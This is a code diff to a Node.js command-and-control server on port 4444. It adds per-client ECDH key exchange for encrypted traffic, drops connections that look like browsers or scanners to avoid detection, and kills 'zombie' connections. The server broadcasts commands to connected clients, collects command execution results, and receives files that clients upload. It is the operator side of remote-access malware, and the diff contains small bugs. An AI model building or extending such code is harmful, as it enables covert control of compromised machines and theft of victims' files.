@@ -8,15 +8,6 @@ const path = require('path');
 const HOST = '0.0.0.0';
 const PORT = 4444;
 
-// --- Encryption Key Configuration ---
-// TODO: Connect using the ECDH algorithm
-const AES_KEY = Buffer.from('Hexadecimal_format_aes_key', 'hex');
-
-if (AES_KEY.length !== 32) {
-    console.error(`[!] Error: AES_KEY must be exactly 32 bytes (256 bits) long. Current length: ${AES_KEY.length}`);
-    process.exit(1);
-}
-
 // --- File Storage Directory Configuration ---
 const UPLOAD_DIR = path.join(__dirname, 'client_uploads');
 
@@ -27,24 +18,22 @@ if (!fs.existsSync(UPLOAD_DIR)) {
 
 // --- Client Management and Server Logic ---
 const clients = new Map();
-const incomingFileStates = new Map();
-const clientBuffers = new Map();
 
 // --- Encryption and Decryption Functions ---
-function encrypt(data) {
+function encrypt(data, clientKey) {
     const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv('aes-256-cbc', AES_KEY, iv);
+    const cipher = crypto.createCipheriv('aes-256-cbc', clientKey, iv);
     let encrypted = cipher.update(data);
     encrypted = Buffer.concat([encrypted, cipher.final()]);
     return Buffer.concat([iv, encrypted]);
 }
 
-function decrypt(data) {
+function decrypt(data, clientKey) {
     const iv = data.slice(0, 16);
     const ciphertext = data.slice(16);
 
     try {
-        const decipher = crypto.createDecipheriv('aes-256-cbc', AES_KEY, iv);
+        const decipher = crypto.createDecipheriv('aes-256-cbc', clientKey, iv);
         let decrypted = decipher.update(ciphertext);
         decrypted = Buffer.concat([decrypted, decipher.final()]);
         return decrypted;
@@ -54,9 +43,9 @@ function decrypt(data) {
     }
 }
 
-function sendPacket(socket, payload) {
+function sendPacket(socket, payload, clientKey) {
     try {
-        const encryptedPayload = encrypt(payload);
+        const encryptedPayload = encrypt(payload, clientKey);
         const lengthPrefix = Buffer.alloc(4);
         lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
         socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
@@ -67,118 +56,163 @@ function sendPacket(socket, payload) {
 
 const server = net.createServer(socket => {
     const addr = `${socket.remoteAddress}:${socket.remotePort}`;
-    clients.set(addr, socket);
-    clientBuffers.set(addr, { buffer: Buffer.alloc(0), expectedLength: 0 });
-    console.log(`[+] Client connected: ${addr}`);
+    console.log(`[+] New Connection: ${addr} (Starting Key Exchange...)`);
+    socket.setTimeout(3000);
+
+    const serverECDH = crypto.createECDH('secp256k1');
+    serverECDH.generateKeys();
+
+    clients.set(addr, {
+        socket: socket,
+        key: null,
+        ecdh: serverECDH,
+        state: 'HANDSHAKE',
+        buffer: Buffer.alloc(0),
+        expectedLength: 0,
+        fileState: null
+    });
+
+    const serverPublicKey = serverECDH.getPublicKey();
+    const pubKeyLen = Buffer.alloc(4);
+    pubKeyLen.writeUInt32BE(serverPublicKey.length, 0);
+    socket.write(Buffer.concat([pubKeyLen, serverPublicKey]));
 
     socket.on('data', data => {
-        const clientBufState = clientBuffers.get(addr);
-        clientBufState.buffer = Buffer.concat([clientBufState.buffer, data]);
+        const headerPeek = data.subarray(0, 4).toString('utf8');
+
+        if (['GET ', 'POST', 'HEAD', 'PUT '].includes(headerPeek)) {
+            console.log(`[!] Browser/Scanner detected from ${addr}. Dropping connection.`);
+            socket.end();
+            return;
+        }
+
+        const clientObj = clients.get(addr);
+        if (!clientObj) return;
+
+        clientObj.buffer = Buffer.concat([clientObj.buffer, data]);
 
         while (true) {
             // 1. Read message length prefix
-            if (clientBufState.expectedLength === 0) {
-                if (clientBufState.buffer.length >= 4) {
-                    clientBufState.expectedLength = clientBufState.buffer.readUInt32BE(0);
-                    clientBufState.buffer = clientBufState.buffer.slice(4);
+            if (clientObj.expectedLength === 0) {
+                if (clientObj.buffer.length >= 4) {
+                    clientObj.expectedLength = clientObj.buffer.readUInt32BE(0);
+                    clientObj.buffer = clientObj.buffer.subarray(4);
                 } else {
                     break; // Incomplete length prefix
                 }
             }
 
             // 2. Read actual message body
-            if (clientBufState.buffer.length >= clientBufState.expectedLength) {
-                const messageBuffer = clientBufState.buffer.slice(0, clientBufState.expectedLength);
-                clientBufState.buffer = clientBufState.buffer.slice(clientBufState.expectedLength);
-                clientBufState.expectedLength = 0; // Reset length for the next message
+            if (clientObj.buffer.length >= clientObj.expectedLength) {
+                const packetBody = clientObj.buffer.slice(0, clientObj.expectedLength);
+                clientObj.buffer = clientObj.buffer.slice(clientObj.expectedLength);
+                clientObj.expectedLength = 0; // Reset length for the next message
 
-                try {
-                    const decryptedData = decrypt(messageBuffer);
-
-                    let dataStrPeek = "";
+                if (clientObj.state === 'HANDSHAKE') {
                     try {
-                        dataStrPeek = decryptedData.toString('utf8', 0, Math.min(decryptedData.length, 100));
-                    } catch (strErr) {
-                        console.error(`(Server): [${addr}] UTF-8 conversion error: ${strErr.message}`);
+                        const clientPublicKey = packetBody;
+                        const sharedSecret = clientObj.ecdh.computeSecret(clientPublicKey);
+                        const derivedKey = crypto.createHash('sha256').update(sharedSecret).digest();
+
+                        clientObj.key = derivedKey;
+                        clientObj.state = 'ESTABLISHED';
+                        socket.setTimeout(0);
+                        delete clientObj.ecdh;
+
+                        console.log(`[+] Key Exchange Complete with ${addr}. Secure Channel Established.`);
+                    } catch (e) {
+                        console.error(`[!] Handshake Failed with ${addr}: ${e.message}`);
+                        socket.end();
                     }
-                    console.log(`(Server): [${addr}] Decrypted data (total length): ${decryptedData.length} bytes`);
-
-
-                    // --- Process file content if currently in file reception state (Phase 2) ---
-                    if (incomingFileStates.has(addr)) {
-                        let fileState = incomingFileStates.get(addr);
-                        // decryptedData contains the actual file content, so we use it directly.
-                        // Since fileState.receivedBytes was previously initialized with Buffer.alloc(0),
-                        // the first file content message will fill receivedBytes.
-                        fileState.receivedBytes = Buffer.concat([fileState.receivedBytes, decryptedData]);
-
-                        console.log(`[${addr}] Receiving file data: ${fileState.receivedBytes.length}/${fileState.expectedLength} bytes (based on original file size)`);
-
-                        if (fileState.receivedBytes.length >= fileState.expectedLength) {
-                            // At this point, fileState.receivedBytes length should exactly match fileState.expectedLength.
-                            // If it exceeds, the extra data is trimmed.
-                            const fileContent = fileState.receivedBytes.slice(0, fileState.expectedLength);
-                            const filename = fileState.filename;
-                            const savePath = path.join(UPLOAD_DIR, `${addr.replace(/:/g, '_')}_${filename}`);
-
-                            fs.writeFile(savePath, fileContent, err => {
-                                if (err) {
-                                    console.error(`[!] ${addr} File save error (${filename}): ${err.message}`);
-                                    sendResponse(socket, `SERVER_RESPONSE:UPLOAD_ERROR:${err.message}`);
-                                } else {
-                                    console.log(`[${addr}] File '${filename}' received and saved successfully: ${savePath} (${fileContent.length} B)`);
-                                    sendResponse(socket, `SERVER_RESPONSE:UPLOAD_SUCCESS:${filename}`);
-                                }
-                                incomingFileStates.delete(addr); // Reset file transfer state
-                            });
+                } else if (clientObj.state === 'ESTABLISHED') {
+                    try {
+                        const decryptedData = decrypt(packetBody, clientObj.key);
+                        if (!decryptedData) return console.error(`[!] Decryption Failed from ${addr}`);
+                        let dataStrPeek = "";
+                        try {
+                            dataStrPeek = decryptedData.toString('utf8', 0, Math.min(decryptedData.length, 100));
+                        } catch (strErr) {
+                            console.error(`(Server): [${addr}] UTF-8 conversion error: ${strErr.message}`);
                         }
-                    } else {
-                        // --- Process general commands or file headers (Phase 1) ---
-                        if (dataStrPeek.startsWith('FILE_UPLOAD_HEADER:')) {
-                            const fullHeaderStr = decryptedData.toString('utf8');
-                            console.log(`(Server): [${addr}] Full received header string: '${fullHeaderStr}'`);
+                        console.log(`(Server): [${addr}] Decrypted data (total length): ${decryptedData.length} bytes`);
 
-                            const parts = fullHeaderStr.split(':', 3);
 
-                            if (parts.length < 3) {
-                                console.error(`[!] ${addr} Header parsing error: Expected format 'FILE_UPLOAD_HEADER:path:length' not met. Received parts:`, parts);
-                                return;
+                        // --- Process file content if currently in file reception state (Phase 2) ---
+                        if (clientObj.fileState) {
+                            let fileState = clientObj.fileState;
+                            // decryptedData contains the actual file content, so we use it directly.
+                            // Since fileState.receivedBytes was previously initialized with Buffer.alloc(0),
+                            // the first file content message will fill receivedBytes.
+                            fileState.receivedBytes = Buffer.concat([fileState.receivedBytes, decryptedData]);
+
+                            console.log(`[${addr}] Receiving file data: ${fileState.receivedBytes.length}/${fileState.expectedLength} bytes (based on original file size)`);
+
+                            if (fileState.receivedBytes.length >= fileState.expectedLength) {
+                                // At this point, fileState.receivedBytes length should exactly match fileState.expectedLength.
+                                // If it exceeds, the extra data is trimmed.
+                                const fileContent = fileState.receivedBytes.slice(0, fileState.expectedLength);
+                                const filename = fileState.filename;
+                                const savePath = path.join(UPLOAD_DIR, `${addr.replace(/:/g, '_')}_${filename}`);
+
+                                fs.writeFile(savePath, fileContent, err => {
+                                    if (err) {
+                                        console.error(`[!] ${addr} File save error (${filename}): ${err.message}`);
+                                        sendResponse(socket, `SERVER_RESPONSE:UPLOAD_ERROR:${err.message}`);
+                                    } else {
+                                        console.log(`[${addr}] File '${filename}' received and saved successfully: ${savePath} (${fileContent.length} B)`);
+                                        sendResponse(socket, `SERVER_RESPONSE:UPLOAD_SUCCESS:${filename}`, clientObj.key);
+                                    }
+                                    clientObj.fileState = null; // Reset file transfer state
+                                });
                             }
+                        } else {
+                            // --- Process general commands or file headers (Phase 1) ---
+                            if (dataStrPeek.startsWith('FILE_UPLOAD_HEADER:')) {
+                                const fullHeaderStr = decryptedData.toString('utf8');
+                                console.log(`(Server): [${addr}] Full received header string: '${fullHeaderStr}'`);
 
-                            const base64EncodedPath = parts[1];
-                            try {
-                                const originalPathBuffer = Buffer.from(base64EncodedPath, 'base64');
-                                const originalPath = originalPathBuffer.toString('utf8');
+                                const parts = fullHeaderStr.split(':', 3);
 
-                                const fileLength = parseInt(parts[2], 10);
-                                const filename = path.basename(originalPath);
-
-
-                                if (isNaN(fileLength)) {
-                                    console.error(`[!] ${addr} File length parsing error: '${parts[2]}' is not a valid number.`);
+                                if (parts.length < 3) {
+                                    console.error(`[!] ${addr} Header parsing error: Expected format 'FILE_UPLOAD_HEADER:path:length' not met. Received parts:`, parts);
                                     return;
                                 }
 
-                                incomingFileStates.set(addr, {
-                                    expectedLength: fileLength,
-                                    receivedBytes: Buffer.alloc(0),
-                                    filename: filename
-                                });
-                                console.log(`[${addr}] File upload header received: '${filename}', expected original size: ${fileLength} bytes. Waiting for file content...`);
-                            } catch (e) {
-                                console.error(`[!] ${addr} Base64 decoding error or UTF-8 conversion error: ${e.message}`);
-                                return;
+                                const base64EncodedPath = parts[1];
+                                try {
+                                    const originalPathBuffer = Buffer.from(base64EncodedPath, 'base64');
+                                    const originalPath = originalPathBuffer.toString('utf8');
+
+                                    const fileLength = parseInt(parts[2], 10);
+                                    const filename = path.basename(originalPath);
+
+
+                                    if (isNaN(fileLength)) {
+                                        console.error(`[!] ${addr} File length parsing error: '${parts[2]}' is not a valid number.`);
+                                        return;
+                                    }
+
+                                    clientObj.fileState = {
+                                        filename: filename,
+                                        expectedLength: fileLength,
+                                        receivedBytes: Buffer.alloc(0)
+                                    };
+                                    console.log(`[${addr}] File upload header received: '${filename}', expected original size: ${fileLength} bytes. Waiting for file content...`);
+                                } catch (e) {
+                                    console.error(`[!] ${addr} Base64 decoding error or UTF-8 conversion error: ${e.message}`);
+                                    return;
+                                }
+                            } else if (dataStrPeek.startsWith('CHECK_IN:')) {
+                                const clientInfo = decryptedData.toString('utf8').substring('CHECK_IN:'.length);
+                                console.log(`[${addr}] Client check-in: ${clientInfo}`);
+                            } else {
+                                console.log(`[${addr}] Command execution result:\n${decryptedData.toString('utf8')}`);
                             }
-                        } else if (dataStrPeek.startsWith('CHECK_IN:')) {
-                            const clientInfo = decryptedData.toString('utf8').substring('CHECK_IN:'.length);
-                            console.log(`[${addr}] Client check-in: ${clientInfo}`);
-                        } else {
-                            console.log(`[${addr}] Command execution result:\n${decryptedData.toString('utf8')}`);
                         }
+                    } catch (e) {
+                        console.error(`[!] ${addr} Data decryption or processing error: ${e.message}. Problematic message (HEX, first 100 chars): ${packetBody.toString('hex').substring(0, 100)}...`);
+                        clients.expectedLength = 0; // Reset length to prepare for the next message in case of an error
                     }
-                } catch (e) {
-                    console.error(`[!] ${addr} Data decryption or processing error: ${e.message}. Problematic message (HEX, first 100 chars): ${messageBuffer.toString('hex').substring(0, 100)}...`);
-                    clientBufState.expectedLength = 0; // Reset length to prepare for the next message in case of an error
                 }
             } else {
                 break;
@@ -189,8 +223,11 @@ const server = net.createServer(socket => {
     socket.on('close', () => {
         console.log(`[-] Client disconnected: ${addr}`);
         clients.delete(addr);
-        incomingFileStates.delete(addr);
-        clientBuffers.delete(addr);
+    });
+
+    socket.on('timeout', () => {
+        console.log(`[-] Timeout (Zombie killed): ${addr}`);
+        socket.destroy();
     });
 
     socket.on('error', err => {
@@ -199,8 +236,8 @@ const server = net.createServer(socket => {
 });
 
 // Helper function to send encrypted responses with length prefix
-function sendResponse(socket, message) {
-    const encryptedPayload = encrypt(Buffer.from(message, 'utf8'));
+function sendResponse(socket, message, clientKey) {
+    const encryptedPayload = encrypt(Buffer.from(message, 'utf8'), clientKey);
     const lengthPrefix = Buffer.alloc(4);
     lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
     socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
@@ -235,15 +272,6 @@ rl.on('line', async line => {
     const target = parts[0];
     const commandType = parts[1] ? parts[1].toUpperCase() : '';
     const cmdArgs = parts.slice(2).join(' ');
-
-    // if you want to target a specific client
-    // const clientSocket = clients.get(target);
-
-    // if (!clientSocket) {
-    //     console.log('Specified client not found. Currently connected clients:', Array.from(clients.keys()));
-    //     rl.prompt();
-    //     return;
-    // }
 
     let payloadToSend;
 
@@ -296,32 +324,25 @@ rl.on('line', async line => {
         if (clients.size === 0) console.log("[!] No clients.");
         else {
             let count = 0;
-            for (const socket of clients.values()) {
-                sendPacket(socket, payloadToSend);
-                count++;
+            for (const clientObj of clients.values()) {
+                if (clientObj.state === 'ESTABLISHED') {
+                    sendPacket(clientObj.socket, payloadToSend, clientObj.key);
+                    count++;
+                }
             }
             console.log(`[+] Broadcasted to ${count} clients.`);
         }
     } else {
         const socket = clients.get(target);
         if (!socket) {
-            console.log(`[!] Client '${target}' not found. Available:`, Array.from(clients.keys()));
+            console.log(`[!] Client '${target}' not found. Available: ${Array.from(clients.keys())}`);
+        } else if (socket.state !== 'ESTABLISHED') {
+            console.log(`[!] Client is performing handshake. Wait.`);
         } else {
-            sendPacket(socket, payloadToSend);
+            sendPacket(socket.socket, payloadToSend, socket.key);
             console.log(`[+] Sent to ${target}`);
         }
     }
 
-    // if you want to target a specific client
-    // try {
-    //     const encryptedPayload = encrypt(payloadToSend);
-    //     const lengthPrefix = Buffer.alloc(4);
-    //     lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
-    //     clientSocket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
-
-    // } catch (e) {
-    //     console.error(`[!] Encryption or transmission error: ${e.message}`);
-    // }
-    
     rl.prompt();
 });
